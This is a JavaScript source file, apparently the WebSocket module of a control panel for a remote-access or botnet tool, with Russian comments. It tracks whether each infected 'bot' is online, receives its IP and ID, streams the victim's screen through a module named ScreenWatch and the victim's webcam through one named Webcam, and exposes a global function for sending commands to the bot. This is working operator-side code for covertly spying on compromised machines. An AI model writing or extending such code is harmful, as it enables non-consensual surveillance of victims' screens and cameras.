// frontend/client_control/js/modules/websocket/connection.js

/* ==========================================================================
   1. ИМПОРТЫ И УТИЛИТЫ (Imports & UI Helpers)
========================================================================== */

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null, botWatchdog = null;
const decoder = new TextDecoder();

/** Обновление текстовых полей в UI */
const updateUI = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || '...';
};

/** Управление индикатором жизни бота */
const setOnline = (isOnline) => {
    const indicator = document.getElementById('status-indicator');
    if (indicator) indicator.classList.toggle('online', isOnline);
    updateUI('status-text', isOnline ? 'online' : 'offline');
};

/* ==========================================================================
   2. ОБРАБОТКА ВХОДЯЩИХ ПАКЕТОВ (Data Handling)
========================================================================== */

function handleIncomingData(buffer) {
    const pkg = decodePacket(buffer);
    // Игнорируем пакеты, не предназначенные для текущего открытого бота
    if (!pkg || pkg.id !== AppState.clientId) return;

    // Жизненный цикл бота: обновляем статус при получении любых данных
    setOnline(true);
    clearTimeout(botWatchdog);
    botWatchdog = setTimeout(() => setOnline(false), 10000);

    switch (pkg.module) {
        case 'DataScribe':
        case 'Heartbeat':
            try {
                const data = JSON.parse(decoder.decode(pkg.payload));
                if (data.ip) updateUI('display-ip', data.ip);
                if (data.id) updateUI('display-id', data.id);
            } catch (e) { console.warn("[WS] Metadata Error"); }
            break;

        case 'ScreenWatch':
            // Передаем сырые байты в рендерер экрана
            if (pkg.payload.byteLength > 200) renderScreenRGBA(pkg.payload);
            break;

        case 'Webcam':
            // Рендеринг веб-камеры через глобальный диспетчер
            if (window.renderWebcam) {
                window.renderWebcam(pkg.payload);
            }
            break;

        default:
            // Прочие бинарные данные пробрасываем в систему событий
            window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
    }
}

/* ==========================================================================
   3. УПРАВЛЕНИЕ СОЕДИНЕНИЕМ (Connection Management)
========================================================================== */

export function initControlConnection() {
    const { token, login } = {
        token: localStorage.getItem('auth_token'),
        login: localStorage.getItem('user_login')
    };

    if (!token || !login || !AppState.clientId) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`);
    socket.binaryType = 'arraybuffer';

    socket.onopen = () => {
        console.log("🚀 [WS] Connected to Control");
        // Запрашиваем свежие данные о боте сразу после входа
        window.sendToBot("DataScribe", "get_metadata");

        // Поддержание сессии (Keep-Alive)
        setInterval(() => {
            if (socket?.readyState === 1) socket.send(encodePacket("", "Heartbeat", "ping"));
        }, 25000);
    };

    socket.onmessage = (e) => e.data instanceof ArrayBuffer && handleIncomingData(e.data);

    socket.onclose = () => {
        setOnline(false);
        clearTimeout(botWatchdog);
    };

    /** Глобальный метод для отправки команд боту из любого модуля */
    window.sendToBot = (mod, pay) => {
        if (socket?.readyState === 1) {
            socket.send(encodePacket(AppState.clientId, mod, pay));
        }
    };
}